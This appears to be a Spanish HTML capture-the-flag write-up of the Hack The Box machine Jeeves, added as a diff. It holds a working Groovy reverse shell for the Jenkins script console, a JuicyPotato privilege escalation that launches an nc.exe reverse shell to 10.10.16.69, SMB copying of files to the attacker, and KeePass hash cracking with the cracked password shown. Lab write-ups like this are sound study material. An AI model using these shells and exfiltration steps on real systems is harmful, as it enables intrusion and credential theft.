@@ -1,0 +1,128 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Jeeves HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/jeeves/pasted-20260314133802.png" alt="Jeeves HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Jeeves</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>jenkins</span>
+            <span>impersonación</span>
+            <span>potato</span>
+            <span>groovy</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing descubre Jenkins en un puerto alternativo</li>
+            <li><code>Explotación</code>: Consola Groovy de Jenkins para obtener shell</li>
+            <li><code>Escalada de Privilegios</code>: <code>SeImpersonatePrivilege</code> mediante JuicyPotato</li>
+            <li><code>Escalada de Privilegios</code>: KeePass <code>.kdbx</code> revela credenciales adicionales</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260314134827.png" alt="Jeeves HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Fuzzing de web del puerto 50000</h3>
+            <pre><code>gobuster dir -u http://jeeves:50000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 30
+# Ruta CMS Jenkis -&gt; http://jeeves:50000/askjeeves</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260314143926.png" alt="Jeeves HTB" />
+          <div class="code-card">
+            <h3>Path Consola Jenkins</h3>
+            <pre><code># http://jeeves:50000/askjeeves/script/
+# Kali: Listener
+penelope -p 443
+# Consola Jenkins
+Thread.start {
+String host="&lt;kali_ip&gt;";
+int port=443;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+}</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260314143905.png" alt="Jeeves HTB" />
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260314230759.png" alt="Jeeves HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Impersonate JuicyPotato</h2>
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260314233842.png" alt="Jeeves HTB" />
+          <div class="code-card">
+            <h3>JuicyPotato</h3>
+            <pre><code># Subir JuicyPotato.exe y nc.exe
+JuicyPotato.exe -l 53375  -p c:\windows\system32\cmd.exe -a "/c C:\Windows\Temp\prives\nc.exe 10.10.16.69 443 -e cmd.exe" -t *</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Leer fichero oculto</h3>
+            <pre><code>copy hm.txt \\10.10.16.69\SMB\</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260314233732.png" alt="Jeeves HTB" />
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260314233742.png" alt="Jeeves HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: KeePass</h2>
+          <div class="code-card">
+            <h3>Enumerar directorios</h3>
+            <pre><code>tree /f /a</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260316124110.png" alt="Jeeves HTB" />
+          <div class="code-card">
+            <h3>Traernos el fichero .kdbx a Kali</h3>
+            <pre><code># Kali
+impacket-smbserver SMB $(pwd)
+# Windows
+copy CEH.kdbx \\10.10.16.69\SMB\</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Extraer hash del fichero .kdbx</h3>
+            <pre><code>keepass2john CEH.kdbx</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Desencriptar hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Password: moonshine1</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260316124434.png" alt="Jeeves HTB" />
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260316125347.png" alt="Jeeves HTB" />
+          <img class="writeup-image" src="/writeups/assets/jeeves/pasted-20260316125404.png" alt="Jeeves HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>jenkins</span>
+            <span>impersonación</span>
+            <span>potato</span>
+            <span>groovy</span>
+            <span>keepass</span>
+            <span>kdbx</span>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Notas</h2>
+          <p>[[Impersonate]]</p>
+          <p>[[Archivo KeePass]]</p>
+          <p>[[Jenkins]]</p>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
